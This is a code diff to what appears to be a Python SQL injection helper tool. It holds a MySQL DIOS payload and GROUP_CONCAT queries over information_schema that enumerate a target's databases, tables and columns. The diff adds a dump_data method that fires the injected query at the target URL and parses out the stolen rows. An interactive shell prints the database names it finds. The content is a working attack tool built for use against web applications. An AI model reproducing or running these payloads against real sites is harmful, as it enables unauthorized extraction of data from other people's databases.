@@ -6,11 +6,25 @@ class Sqli:
 
     def __init__(self, url):
       self.url           = url
-      self.dios          = " (select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x) "
+      self.dios          = "(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x) "
       self.show_dbs      = "(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)"
       self.database_name = ""
       self.show_tables   = "(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x"
       self.show_columns  = "(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+information_schema.COLUMNS+WHERE+TABLE_NAME=0x"
+      self.result = ''
+
+    def get_result(self,plaintext):
+        sqli_helper = re.search("<sqli-helper>(.*)</sqli-helper>",plaintext)
+        if ( sqli_helper ):
+            return sqli_helper.group(1)
+        else:
+            return {
+                    "status": False,
+                    "message": "Response sql injectin do not match"
+                }
+    def getResultByTag(self, tag):
+        sqli_helper = re.search(f"<{tag}>(.*)</{tag}>",self.result)
+        return sqli_helper.group(1) if bool(sqli_helper) else "Can't get information"
 
     def information(self, level=1):
         dios = Dios().get_information()
@@ -72,6 +86,25 @@ class Sqli:
                     "socket": socket 
         }
     
+    def dump_data(self, tables, columns, database):
+        query = Dios().dump_data(tables, columns, database)
+        query_builder = Dios().build(query)
+        response = requests.get(self.url.replace('*',query_builder))
+        result = self.get_result(response.text)
+        sqli_array = result.split('<end/>,')
+
+        realResult=dict()
+        realResult['columns'] = columns
+        realResult['data'] = list()
+        for sqli in sqli_array:
+            self.result = sqli
+
+            result = dict()
+            for column in columns:
+                result[column] = self.getResultByTag(column)
+            realResult['data'].append(result)
+        return realResult
+
     def command_line(self):
         user   = Dios().build(Dios().user())
         domain = re.search(r'(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}', self.url)[0]
@@ -92,7 +125,9 @@ class Sqli:
             elif cmd == "show dbs":
                 r           = requests.get(self.url.replace('*', Dios().build(self.show_dbs)))
                 output      = re.search("<sqli-helper>(.*)</sqli-helper>",r.text).group(1)
+
                 print("[\033[92m+\033[97m] Database : ")
+
                 output = output.split("<br>")
                 for db in output:
                     print(f"└[\033[92m•\033[97m] {db}")
